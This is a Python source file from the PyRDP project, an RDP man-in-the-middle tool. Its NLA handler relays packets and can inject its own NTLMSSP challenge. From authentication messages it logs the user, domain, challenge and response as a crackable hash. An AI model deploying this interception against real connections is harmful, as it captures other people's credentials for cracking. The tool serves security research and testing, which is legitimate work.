#
# This file is part of the PyRDP project.
# Copyright (C) 2021 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

import logging
from codecs import decode
from random import getrandbits

from pyrdp.enum import NTLMSSPMessageType
from pyrdp.layer import SegmentationObserver, IntermediateLayer
from pyrdp.logging import LOGGER_NAMES
from pyrdp.logging.formatters import NTLMSSPHashFormatter
from pyrdp.parser import NTLMSSPParser
from pyrdp.pdu import NTLMSSPPDU, NTLMSSPNegotiatePDU, NTLMSSPChallengePDU, NTLMSSPAuthenticatePDU
from pyrdp.security import NTLMSSPState


class NLAHandler(SegmentationObserver):
    """
    Handles NLA packets by forwarding them transparently, using the onUnknownHeader event from SegmentationObserver.
    The event will be triggered when packets are sent that are neither fast-path nor TPKT (i.e: NLA).
    This also logs the hash of NLA connection attempts.
    """

    def __init__(self, sink: IntermediateLayer, state: NTLMSSPState, log: logging.LoggerAdapter, ntlmCatch: bool = False):
        """
        Create a new NLA Handler.
        sink: layer to forward packets to.
        state: NTLMSSPState that is shared between both the client-facing handler and the server-facing handler.
        """

        super().__init__()
        self.sink = sink
        self.ntlmSSPState = state
        self.log = log
        self.catch = ntlmCatch
        self.ntlmSSPParser = NTLMSSPParser()

    def getRandChallenge(self):
        """
        Generate a random 32-bit challenge
        """
        challenge = b'%016x' % getrandbits(16 * 4)
        return decode(challenge, 'hex')

    def onUnknownHeader(self, header, data: bytes):
        signatureOffset = self.ntlmSSPParser.findMessage(data)

        if signatureOffset != -1:
            message: NTLMSSPPDU = self.ntlmSSPParser.parse(data)
            self.ntlmSSPState.setMessage(message)

            if message.messageType == NTLMSSPMessageType.NEGOTIATE_MESSAGE and self.catch:
                randomChallenge = self.getRandChallenge()
                self.log.info("NTLMSSP Negotiation")
                challenge: NTLMSSPChallengePDU = NTLMSSPChallengePDU(randomChallenge)
                
                # There might be no state if server side connection was shutdown
                if not self.ntlmSSPState:
                    self.ntlmSSPState = NTLMSSPState()
                self.ntlmSSPState.setMessage(challenge)
                self.ntlmSSPState.challenge.serverChallenge = randomChallenge
                data = self.ntlmSSPParser.writeNTLMSSPChallenge('WINNT', randomChallenge)
            
            if message.messageType == NTLMSSPMessageType.AUTHENTICATE_MESSAGE:
                message: NTLMSSPAuthenticatePDU
                user = message.user
                domain = message.domain
                serverChallenge = self.ntlmSSPState.challenge.serverChallenge
                proof = message.proof
                response = message.response

                logging.getLogger(LOGGER_NAMES.NTLMSSP).info(user, domain, serverChallenge, proof, response)

                ntlmSSPHash = NTLMSSPHashFormatter.formatNTLMSSPHash(user, domain, serverChallenge, proof, response)
                self.log.info("[!] NTLMSSP Hash: %(ntlmSSPHash)s", {
                    "ntlmSSPHash": (ntlmSSPHash)
                })

        self.sink.sendBytes(data)
